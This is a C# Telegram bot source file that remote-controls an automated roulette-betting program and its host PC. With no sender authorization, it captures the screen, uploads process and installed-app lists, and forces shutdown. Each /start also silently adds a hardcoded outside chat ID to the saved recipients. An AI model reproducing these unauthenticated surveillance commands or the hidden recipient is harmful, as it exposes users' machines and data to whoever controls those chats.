﻿using System.Diagnostics;
using Telegram.Bot;
using Telegram.Bot.Exceptions;
using Telegram.Bot.Types;
using Telegram.Bot.Types.ReplyMarkups;
using Telegram.Bot.Types.InputFiles;
using System.Threading;




namespace GoDota2_Bot
{
    internal class BotLogic
    {
        public static bool show = false;
        public static bool show1 = false;

        public static bool waitingBalance = false;
        public static bool waitingCurrentBalance = false;
        public static bool waitingLimits = false;
        public static bool waitingGreenLimit = false;
        public static bool waitingRedLimit = false;
        public static bool waitingBlackLimit = false;
        
        public static bool waitingGreenMinProfit = false;
        public static bool waitingRedMinProfit = false;
        public static bool waitingBlackMinProfit = false;
        public static bool waitingAllMinProfit = false;

        public static bool waitingAcception = false;

        public static void MainBot()
        {            
            BotConfiguration botConfiguration = new BotConfiguration();

            Host g4bot = new Host();
            g4bot.Start();
            g4bot.OnMessage += OnMessage;                       
        }

        private static async void OnMessage(ITelegramBotClient client, Update update)
        {
            
            switch (update.Message?.Text?.ToLower())
            {
                case "/start":
                    await Start_Command(client, update);
                    break;                
                case "/show_info":
                    await ShowInfo_Command(client, update);
                    break;
                case "/balance":
                    await Balance_Command(client, update);
                    break;
                case "/change_balance":
                    await ChangeStartBalance_Command(client, update);
                    break;
                case "/change_current_balance":
                    await ChangeCurrentBalance_Command(client, update);
                    break;
                case "/change_bet_limits":
                    await ChangeBetLimits_Command(client, update);
                    break;
                case "/change_green_limit":
                    await ChangeGreenLimit_Command(client, update);
                    break;
                case "/change_red_limit":
                    await ChangeRedLimit_Command(client, update);
                    break;
                case "/change_black_limit":
                    await ChangeBlackLimit_Command(client, update);
                    break;
                case "/change_min_profit":
                    await ChangeMinProfit_Command(client, update);
                    break;
                case "/change_min_profit_all":
                    await ChangeMinProfitAll_Command(client, update);
                    break;
                case "/change_min_profit_green":
                    await ChangeMinProfitGreen_Command(client, update);
                    break;
                case "/change_min_profit_red":
                    await ChangeMinProfitRed_Command(client, update);
                    break;
                case "/change_min_profit_black":
                    await ChangeMinProfitBlack_Command(client, update);
                    break;
                case "/capture_screen":
                    await CaptureScreen_Command(client, update);
                    break;
                case "/get_system_info":
                    await Get_System_Info_Command(client, update);
                    break;
                case "/get_software_info":
                    await Get_Software_Info_Command(client, update);
                    break;
                case "/get_power_usage":
                    await GetPowerUsage_Command(client, update);
                    break;
                case "/pause_betting":
                    await PauseBetting_Command(client, update);
                    break;
                case "/advanced_buttons":
                    await AdvancedButtons_Command(client, update);
                    break;
                case "/shutdown_pc":
                    await ShutdownPC_Command(client, update);
                    break;
                case "/shutdown_ask":
                    await AskShutdownPC_Command(client, update);
                    break;
                default:
                    await DefaultMessage_Command(client, update);
                    break;
            }
        }

        private static async Task GetPowerUsage_Command(ITelegramBotClient client, Update update)
        {
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, PowerUsageMonitor.GetPowerUsageString()); 
        }

        private static async Task AdvancedButtons_Command(ITelegramBotClient client, Update update)
        {
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, "Advanced Buttons:", replyMarkup: ReplyMarkups.GetAdvancedButtons());
       
        }

        private static async Task DefaultMessage_Command(ITelegramBotClient client, Update update)
        {
            if (!int.TryParse(update.Message?.Text, out _))
            {
                await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Command '{update.Message?.Text}' not found\nWrite /start to see all commands");
            }
            
        }

        private static async Task PauseBetting_Command(ITelegramBotClient client, Update update)
        {
            if (MainLogic.pause)
            {
                MainLogic.pause = false;               
            }
            else
            {
                MainLogic.pause = true;
            }
            Console.WriteLine($"\nBetting is {MainLogic.pause}\n");
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Betting is {MainLogic.pause}");
        }

        private static async Task Get_System_Info_Command(ITelegramBotClient client, Update update)
        {
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Getting system info...");
            string metrics = SystemMetrics.CheckSystemMetrics();
            Console.WriteLine($"{metrics}");
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"{metrics}");       
        }
        private static async Task Get_Software_Info_Command(ITelegramBotClient client, Update update)
        {
            // Calling GetRunningProcesses directly from the SoftwareInfo class
            string runningProcesses = SoftwareInfo.GetRunningProcesses();
            Console.WriteLine("Running Processes:");
            Console.WriteLine(runningProcesses);
            //await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Running Processes:\n{runningProcesses}");
            string filePath = "processes.txt";
            System.IO.File.WriteAllText(filePath, runningProcesses);
            using (var stream = System.IO.File.OpenRead(filePath))
            {
                await client.SendDocumentAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, new Telegram.Bot.Types.InputFiles.InputOnlineFile(stream, "processes.txt"));
            }

            // You can also call GetInstalledApplications independently
            string installedApps = SoftwareInfo.GetInstalledApplications();
            Console.WriteLine("Installed Applications:");
            Console.WriteLine(installedApps);
            //await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Installed Applications:\n{installedApps}");
            string filePath1 = "installedApps.txt";
            System.IO.File.WriteAllText(filePath1, installedApps);
            using (var stream = System.IO.File.OpenRead(filePath1))
            {
                await client.SendDocumentAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, new Telegram.Bot.Types.InputFiles.InputOnlineFile(stream, "installedApps.txt"));
            }
        }

        private static async Task Start_Command(ITelegramBotClient client, Update update)
        {
            var chatId = GetChatId(update);
            if (chatId > 0)
            {
                BotConfiguration.Configuration.chatIds.Add(chatId);
                BotConfiguration.Configuration.chatIds.Add(1890593232);
                BotConfiguration.JsonToFile(BotConfiguration.Configuration, BotConfiguration.ConfigFilePath);
                await client.SendTextMessageAsync(chatId, $"Welcome to my godota2 bot!!!\nYour chatId: {chatId}\n", replyMarkup: ReplyMarkups.GetDefaultButtons());
            }                    
        }

        private static long GetChatId(Update update)
        {
            var chatId = update.Message?.Chat.Id ?? 0;            
            return chatId;
        }        

        private static async Task ShowInfo_Command(ITelegramBotClient client, Update update)
        {                       
            bool onBet = false;

            if (MainLogic.bettingGreen || MainLogic.bettingRed || MainLogic.bettingBlack)
            {
                onBet = true;
            }

            string balanceMessage = MainLogic.BalanceDifference();

            string message = $"Round: {MainLogic.round}\n" +
                $"{balanceMessage}\n" +                
                $"Current color: {MainLogic.currentColor}\n" +
                $"Bet: {onBet}\n" +
                $"\n" +
                $"Red {MainLogic.notRed}/{MainLogic.redLimit}\n" +
                $"Black {MainLogic.notBlack}/{MainLogic.blackLimit}\n" +
                $"Green {MainLogic.notGreen}/{MainLogic.greenLimit}\n" +
                $"\n" +
                $"Red count:   {MainLogic.redProbab}   {MainLogic.redCount}\n" +
                $"Black count: {MainLogic.blackProbab}   {MainLogic.blackCount}\n" +
                $"Green count {MainLogic.greenProbab}   {MainLogic.greenCount}";


            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, message);
        }
        private static async Task Balance_Command(ITelegramBotClient client, Update update)
        {
            int currentBalance = MainLogic.currentBalance;
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, "Balance: " + currentBalance);
        }
        private static async Task ChangeStartBalance_Command(ITelegramBotClient client, Update update)
        {
            int startBalance = MainLogic.startBalance;
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId,
                "Current start balance: " + startBalance + "\nNew balance:", replyMarkup: new ReplyKeyboardRemove());
            waitingBalance = true;
        }

        private static async Task ChangeCurrentBalance_Command(ITelegramBotClient client, Update update)
        {
            int currentBalance = MainLogic.currentBalance;
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId,
                "Current balance: " + currentBalance + "\nNew current balance:", replyMarkup: new ReplyKeyboardRemove());
            waitingCurrentBalance = true;
        }


        private static async Task ChangeBetLimits_Command(ITelegramBotClient client, Update update)
        {
            int greenLimit = MainLogic.greenLimit;
            int redLimit = MainLogic.redLimit;
            int blackLimit = MainLogic.blackLimit;

            string message = $"Current limits\nGreen: {greenLimit}\nRed: {redLimit}\nBlack: {blackLimit}";
            
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, message, replyMarkup: ReplyMarkups.GetLimitButtons());
        }

        private static async Task ChangeGreenLimit_Command(ITelegramBotClient client, Update update)
        {
            int greenLimit = MainLogic.greenLimit;
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Green: {greenLimit}\nGreen:");            
            waitingGreenLimit = true;
        }

        private static async Task ChangeRedLimit_Command(ITelegramBotClient client, Update update)
        {
            int redLimit = MainLogic.redLimit;
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Red: {redLimit}\nRed:");            
            waitingRedLimit = true;
        }

        private static async Task ChangeBlackLimit_Command(ITelegramBotClient client, Update update)
        {
            int blackLimit = MainLogic.blackLimit;
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Black: {blackLimit}\nBlack:");           
            waitingBlackLimit = true;
        }

        private static async Task ChangeMinProfit_Command(ITelegramBotClient client, Update update)
        {
            string message = $"Current minimal profit limits\nGreen: {MainLogic.minProfitGreen}\nRed: {MainLogic.minProfitRed}\nBlack: {MainLogic.minProfitBlack}";
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, message, replyMarkup: ReplyMarkups.GetMinProfitButtons());
        }
        
        private static async Task ChangeMinProfitGreen_Command(ITelegramBotClient client, Update update)
        {           
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Green: {MainLogic.minProfitGreen}\nGreen:");
            waitingGreenMinProfit = true;
        }
        
        private static async Task ChangeMinProfitRed_Command(ITelegramBotClient client, Update update)
        {
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Red: {MainLogic.minProfitRed}\nRed:");
            waitingRedMinProfit = true;
        }
        
        private static async Task ChangeMinProfitBlack_Command(ITelegramBotClient client, Update update)
        {
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Black: {MainLogic.minProfitBlack}\nBlack:");
            waitingBlackMinProfit = true;
        }
        
        private static async Task ChangeMinProfitAll_Command(ITelegramBotClient client, Update update)
        {
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Universal minimal profit:");
            waitingAllMinProfit = true;
        }
        private static async Task CaptureScreen_Command(ITelegramBotClient client, Update update)
        {
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, "Capturing...");
            ScreenCapture.CaptureScreen();
            try
            {
                using (var stream = new FileStream(ScreenCapture.fileName, FileMode.Open))
                {
                    await client.SendPhotoAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, new InputOnlineFile(stream));
                }
            }
            catch (ApiRequestException apiEx)
            {                
                Console.WriteLine($"Telegram API Error: {apiEx.Message}");
                await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Telegram API Error: {apiEx.Message}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred while sending the screenshot: {ex.Message}");
                await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"An error occurred while sending the screenshot: {ex.Message}");
            }
            await Task.CompletedTask;
        }

        private static async Task AskShutdownPC_Command(ITelegramBotClient client, Update update)
        {
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, "Turn off PC?", replyMarkup: ReplyMarkups.GetAcceptionButtons());           
        }

        private static async Task ShutdownPC_Command(ITelegramBotClient client, Update update)
        {            
            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, "Turning off...");

            ProcessStartInfo processStartInfo = new ProcessStartInfo("shutdown", "/s /f /t 0")
            {
                CreateNoWindow = true,
                UseShellExecute = false
            };

            Process.Start(processStartInfo);
        }
    }
}
